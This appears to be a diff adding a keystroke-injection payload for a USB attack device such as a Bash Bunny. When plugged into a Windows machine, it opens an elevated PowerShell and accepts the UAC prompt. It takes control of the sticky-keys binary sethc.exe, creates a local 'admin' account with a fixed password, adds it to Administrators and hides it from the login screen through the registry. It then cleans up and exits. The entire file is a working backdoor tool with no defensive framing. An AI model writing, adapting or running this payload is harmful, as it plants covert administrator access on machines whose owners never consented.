@@ -1,0 +1,58 @@
+# Switch to PowerShell with elevated privileges
+ATTACKMODE HID
+LED B 200
+Q GUI
+Q DELAY 500
+Q STRING POWERSHELL
+Q DELAY 1000
+Q CTRL-SHIFT ENTER
+Q DELAY 2000
+Q LEFTARROW
+Q DELAY 100
+Q ENTER
+Q DELAY 1200
+
+# Give permissions for sethc.exe to current user
+LED Y 500 
+Q STRING "\$Acl = Get-Acl sethc.exe"
+Q ENTER
+Q DELAY 100
+Q STRING "\$Ar = New-Object system.security.accesscontrol.filesystemaccessrule(\$env:UserName,\"FullControl\",\"Allow\")"
+Q ENTER
+Q DELAY 100
+Q STRING "\$Acl.SetAccessRule(\$Ar)"
+Q ENTER
+Q DELAY 100
+Q STRING "Set-Acl sethc.exe \$Acl"
+Q ENTER
+Q DELAY 100
+
+# Add a new administrator account with a secure password
+Q STRING "net user admin StrongPassword123! /add /passwordchg:no"
+Q ENTER
+Q DELAY 200
+
+# Give the new account administrator privileges and add it to the Administrators group
+Q STRING "net localgroup administrators admin /add"
+Q ENTER
+Q DELAY 200
+
+# Hide the new account from the login screen
+Q STRING "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList /v admin /t REG_DWORD /d 0 /f"
+Q ENTER
+Q DELAY 200
+
+# Restore sethc.exe
+Q STRING "xcopy sethc.exe.bak sethc.exe /y"
+Q ENTER
+Q DELAY 1000
+
+# GTFO
+Q STRING EXIT
+Q ENTER
+
+# Sync drive
+sync
+
+# Trap is clean!
+LED G
